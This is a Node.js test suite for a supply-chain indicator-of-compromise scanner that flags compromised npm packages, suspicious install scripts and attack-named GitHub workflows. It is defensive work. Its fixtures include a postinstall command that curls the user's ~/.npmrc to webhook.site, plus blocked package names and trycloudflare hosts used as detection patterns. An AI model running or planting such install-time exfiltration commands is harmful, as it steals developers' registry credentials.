import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { scan } from '../ioc-scan.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');

function repo(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ioc-scan-'));
  for (const [rel, value] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), typeof value === 'string' ? value : JSON.stringify(value));
  }
  return dir;
}
const scanFiles = (files) => {
  const dir = repo(files);
  try {
    return scan(dir);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
};
const lock = (packages) => ({ lockfileVersion: 3, packages: { '': { name: 'app' }, ...packages } });

test('a clean repository has no findings', () => {
  const result = scanFiles({
    'package.json': { name: 'app', scripts: { dev: 'vite', postinstall: 'echo ok' } },
    'package-lock.json': lock({ 'node_modules/vite': { version: '6.3.5' } }),
    '.github/workflows/ci.yml': 'on: push\n',
  });
  assert.deepEqual(result, { errors: [], warnings: [] });
});

test('blocked packages and blocked scopes in any lockfile fail, including nested installs', () => {
  const result = scanFiles({
    'frontend/package-lock.json': lock({
      'node_modules/@ctrl/tinycolor': { version: '4.1.1' },
      'node_modules/a/node_modules/rxnt-authentication': { version: '0.0.3' },
      'node_modules/@nativescript-community/ui': { version: '1.0.0' },
    }),
  });
  assert.equal(result.errors.length, 3);
  assert.match(result.errors[0], /^frontend\/package-lock\.json: 침해 보고된 패키지 @ctrl\/tinycolor@4\.1\.1/);
  assert.match(result.errors[1], /rxnt-authentication@0\.0\.3/);
  assert.match(result.errors[2], /침해 보고된 스코프의 패키지 @nativescript-community\/ui@1\.0\.0/);
});

test('install scripts calling exfiltration hosts or dropped files fail; plain scripts do not', () => {
  const result = scanFiles({
    'package.json': { scripts: { postinstall: 'curl https://webhook.site/abc -d @~/.npmrc' } },
    'node_modules/evil/package.json': { scripts: { preinstall: 'node bundle.js' } },
    'node_modules/@scope/ok/package.json': { scripts: { build: 'node bundle.js' } },
  });
  assert.deepEqual(result.errors, [
    'package.json: postinstall 스크립트가 외부 유출 의심 주소(webhook.site)를 호출합니다: curl https://webhook.site/abc -d @~/.npmrc',
    'node_modules/evil: preinstall 스크립트가 의심 파일(bundle.js)을 실행합니다: node bundle.js',
  ]);
});

test('suspicious workflow names and hosts in workflows fail', () => {
  const result = scanFiles({
    '.github/workflows/shai-hulud-workflow.yml': 'on: push\n',
    '.github/workflows/ci.yml': 'run: curl https://x.trycloudflare.com\n',
  });
  assert.equal(result.errors.length, 2);
  assert.ok(result.errors.some((e) => e.includes('침해 사례와 같은 이름')));
  assert.ok(result.errors.some((e) => e.includes('trycloudflare')));
});

test('dependencies with install scripts are listed as a warning', () => {
  const result = scanFiles({ 'package-lock.json': lock({ 'node_modules/esbuild': { version: '0.25.0', hasInstallScript: true } }) });
  assert.deepEqual(result.errors, []);
  assert.match(result.warnings[0], /설치 스크립트가 있는 의존성 1개.*esbuild@0\.25\.0/);
});

test('the vendored copy finds blocked-packages.json next to itself and exits 1 on findings', () => {
  const dir = repo({ 'package-lock.json': lock({ 'node_modules/swc-plugin-component-annotate': { version: '1.0.0' } }) });
  try {
    fs.mkdirSync(path.join(dir, '.standards'));
    fs.copyFileSync(path.join(root, 'scripts/ioc-scan.mjs'), path.join(dir, '.standards/ioc-scan.mjs'));
    fs.copyFileSync(path.join(root, 'security/blocked-packages.json'), path.join(dir, '.standards/blocked-packages.json'));
    const run = spawnSync(process.execPath, [path.join(dir, '.standards/ioc-scan.mjs')], { encoding: 'utf8' });
    assert.equal(run.status, 1);
    assert.match(run.stderr, /swc-plugin-component-annotate@1\.0\.0/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
